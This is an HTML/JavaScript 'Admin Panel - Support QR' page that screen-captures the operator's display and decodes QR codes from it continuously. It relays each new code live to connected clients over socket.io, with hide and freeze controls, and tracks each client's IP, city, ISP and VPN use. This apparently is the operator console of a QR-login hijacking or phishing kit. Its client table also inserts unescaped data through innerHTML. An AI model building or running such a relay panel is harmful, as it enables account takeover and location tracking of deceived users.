<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Admin Panel - Support QR</title>
<script src="/socket.io/socket.io.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>

<style>
:root {
  --bg: #0f1115;
  --panel: #1a1d22;
  --accent: #1e90ff;
  --accent-dark: #0b75d9;
  --text: #e0e6ef;
  --muted: #8a93a5;
  --danger: #dc3545;
  --warning: #f0ad4e;
  --radius: 12px;
  --shadow: 0 0 10px rgba(0,0,0,0.5);
}

body {
  background: var(--bg);
  color: var(--text);
  font-family: "Segoe UI", Arial, sans-serif;
  margin: 0;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 30px 10px;
}

h2 {
  font-weight: 600;
  color: var(--accent);
  margin-bottom: 20px;
  text-shadow: 0 0 8px rgba(30,144,255,0.4);
}

.panel {
  background: var(--panel);
  border-radius: var(--radius);
  box-shadow: var(--shadow);
  padding: 20px;
  max-width: 1000px;
  width: 100%;
}

.controls {
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  margin-bottom: 15px;
  justify-content: center;
}

button {
  border: none;
  border-radius: 8px;
  padding: 10px 16px;
  font-weight: 600;
  cursor: pointer;
  color: #fff;
  transition: all .2s;
}

button.start { background: var(--accent); }
button.start:hover { background: var(--accent-dark); }
button.stop { background: var(--danger); }
button.hide { background: #444; }
button.freeze { background: var(--warning); color: #000; }

.status-box {
  margin-bottom: 15px;
  text-align: center;
}
.status-badge {
  display: inline-block;
  padding: 6px 12px;
  border-radius: 6px;
  background: #333;
  font-weight: 600;
}
.status-badge.idle { background:#333; color:#aaa; }
.status-badge.streaming { background:var(--accent); color:#fff; }
.status-badge.hidden { background:#666; color:#fff; }
.status-badge.frozen { background:var(--warning); color:#000; }

#qrPreview {
  background: #111;
  border-radius: var(--radius);
  box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 260px;
  margin-bottom: 20px;
}

#videoContainer {
  background: #000;
  border-radius: var(--radius);
  overflow: hidden;
  box-shadow: var(--shadow);
  text-align:center;
}
#video {
  width: 640px;
  height: 360px;
  display: block;
  object-fit: cover;
  margin:auto;
}

.table-wrap {
  overflow-x:auto;
}
table {
  width: 100%;
  border-collapse: collapse;
  margin-top: 20px;
  font-size: 14px;
}
th, td {
  border: 1px solid #2b2e34;
  padding: 8px;
  text-align: center;
}
th {
  background: #22252b;
  color: var(--accent);
}
tr:nth-child(even) { background: #1c1f24; }

input[type="number"] {
  width: 80px;
  padding: 5px 8px;
  border-radius: 6px;
  border: 1px solid #555;
  background: #1e2127;
  color: var(--text);
}
</style>
</head>

<body>
  <h2>Admin Panel - Support QR</h2>
  <div class="panel">
    <div class="controls">
      <button id="startBtn" class="start">Start Stream</button>
      <button id="stopBtn" class="stop">Stop Stream</button>
      <button id="hideBtn" class="hide">Hide</button>
      <button id="freezeBtn" class="freeze">Freeze</button>
      <label style="display:flex;align-items:center;gap:8px;color:var(--muted);">
        Interval(s):
        <input id="scanInput" type="number" step="0.05" min="0.25" max="5" value="0.5">
      </label>
    </div>

    <div class="status-box">
      <span id="statusBadge" class="status-badge idle">Idle</span>
    </div>

    <div id="qrPreview">No active QR</div>

    <div id="videoContainer">
      <video id="video" autoplay muted playsinline></video>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>Name</th><th>IP</th><th>City</th><th>Region</th>
            <th>Country</th><th>ISP</th><th>VPN</th><th>Ping</th>
          </tr>
        </thead>
        <tbody id="clientBody"></tbody>
      </table>
    </div>
  </div>

<script>
const socket = io();
socket.emit('join','admin');

let isStreaming=false,isHidden=false,isFrozen=false;
let currentQR=null,stream=null,loop=null;
let scanInterval=500;
const video=document.getElementById('video');
const canvas=document.getElementById('canvas');
const ctx=canvas.getContext('2d',{willReadFrequently:true});
const qrPreview=document.getElementById('qrPreview');
const statusBadge=document.getElementById('statusBadge');
const clientBody=document.getElementById('clientBody');
const scanInput=document.getElementById('scanInput');

function setBadge(){
  statusBadge.className='status-badge';
  if(isStreaming) statusBadge.classList.add('streaming');
  else statusBadge.classList.add('idle');
  if(isHidden) statusBadge.classList.add('hidden');
  if(isFrozen) statusBadge.classList.add('frozen');

  let text='Idle';
  if(isStreaming) text='Streaming';
  if(isHidden) text+=' / Hidden';
  if(isFrozen) text+=' / Frozen';
  statusBadge.textContent=text;
}
function renderQR(v){
  qrPreview.innerHTML='';
  if(!v){ qrPreview.textContent=isHidden?'QR hidden':'No active QR'; return;}
  new QRCode(qrPreview,{text:v,width:256,height:256});
}
function startDetect(){
  stopDetect();
  loop=setInterval(()=>detect(),scanInterval);
}
function stopDetect(){
  if(loop) clearInterval(loop);
  loop=null;
}
function detect(){
  if(!isStreaming||isFrozen||!video.videoWidth)return;
  canvas.width=video.videoWidth;canvas.height=video.videoHeight;
  ctx.drawImage(video,0,0,canvas.width,canvas.height);
  const img=ctx.getImageData(0,0,canvas.width,canvas.height);
  const code=jsQR(img.data,img.width,img.height);
  if(code&&code.data&&code.data!==currentQR){
    currentQR=code.data;
    if(!isHidden)renderQR(code.data);
    socket.emit('qr_update',code.data);
  }
}

document.getElementById('startBtn').onclick=async()=>{
  try{
    stream=await navigator.mediaDevices.getDisplayMedia({video:true});
    video.srcObject=stream;
    socket.emit('start_stream');
    isStreaming=true;
    setBadge();
    startDetect();
  }catch(e){alert('Screen share failed: '+e.message);}
};

document.getElementById('stopBtn').onclick=()=>{
  if(loop)clearInterval(loop);
  if(stream)stream.getTracks().forEach(t=>t.stop());
  socket.emit('stop_stream');
  isStreaming=false;
  currentQR=null;
  renderQR(null);
  setBadge();
};

document.getElementById('hideBtn').onclick=()=>{
  isHidden=!isHidden;
  socket.emit('toggle_hide',isHidden);
  renderQR(isHidden?null:currentQR);
  setBadge();
};

document.getElementById('freezeBtn').onclick=()=>{
  isFrozen=!isFrozen;
  if(isFrozen)stopDetect(); else if(isStreaming)startDetect();
  setBadge();
};

scanInput.onchange=()=>{
  let v=parseFloat(scanInput.value);
  if(isNaN(v))v=0.5;
  if(v<0.25)v=0.25;if(v>5)v=5;
  scanInput.value=v.toFixed(2);
  scanInterval=v*1000;
  if(isStreaming&&!isFrozen)startDetect();
};

socket.on('state',s=>{
  isStreaming=s.isStreaming;
  isHidden=s.isHidden;
  if(s.currentQrValue)currentQR=s.currentQrValue;
  renderQR(isHidden?null:currentQR);
  setBadge();
});
socket.on('hide_state',h=>{
  isHidden=h;
  renderQR(isHidden?null:currentQR);
  setBadge();
});
socket.on('qr_preview',v=>{
  if(!isFrozen&&!isHidden&&v){currentQR=v;renderQR(v);}
});
socket.on('client_list',list=>{
  clientBody.innerHTML='';
  list.forEach(c=>{
    const tr=document.createElement('tr');
    tr.innerHTML=`<td>${c.username}</td><td>${c.ip}</td><td>${c.city}</td><td>${c.region}</td>
    <td>${c.country} ${c.countryFlag||''}</td><td>${c.isp}</td><td>${c.vpn?'Yes':'No'}</td><td>${c.ping}</td>`;
    clientBody.appendChild(tr);
  });
});
setInterval(()=>socket.emit('request_client_list'),3000);
setBadge();
</script>
</body>
</html>
